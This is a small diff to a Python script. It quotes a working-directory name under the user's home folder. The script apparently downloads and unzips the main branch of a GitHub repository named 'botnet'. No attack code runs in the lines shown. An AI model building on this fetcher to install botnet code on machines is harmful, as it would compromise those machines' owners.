@@ -8,7 +8,7 @@ import zipfile
 from pathlib import Path
 
 home_dir = Path.home()
-working_dir = home_dir / temp_folder
+working_dir = home_dir / "temp_folder"
 github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 
 
 def main():
